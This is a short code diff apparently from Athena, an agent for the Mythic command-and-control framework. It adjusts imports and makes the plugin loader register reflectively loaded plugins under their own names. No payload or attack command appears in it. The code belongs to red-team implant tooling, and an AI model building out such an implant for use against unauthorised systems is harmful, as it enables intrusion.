@@ -1,14 +1,13 @@
 using Athena.Commands.Model;
-using Athena.Models.Athena.Commands;
 using Athena.Models.Athena.Assembly;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using System.Collections.Concurrent;
 using System.Reflection;
 using System.Runtime.Loader;
-using Athena.Plugins;
 using Athena.Models;
 using System.Text.Json;
+using Athena.Commands.Models;
 
 namespace Athena.Commands
 {
@@ -222,7 +221,7 @@ namespace Athena.Commands
                     if (typeof(IPlugin).IsAssignableFrom(t))
                     {
                         IPlugin plug = (IPlugin)Activator.CreateInstance(t);
-                        this.loadedPlugins.GetOrAdd(command, plug);
+                        this.loadedPlugins.GetOrAdd(plug.Name, plug);
                         return new LoadCommandResponseResult()
                         {
                             completed = true,
@@ -233,7 +232,7 @@ namespace Athena.Commands
                                     new CommandsResponse()
                                     {
                                         action = "add",
-                                        cmd = command,
+                                        cmd = plug.Name,
                                     }
                                 }
                         }.ToJson();
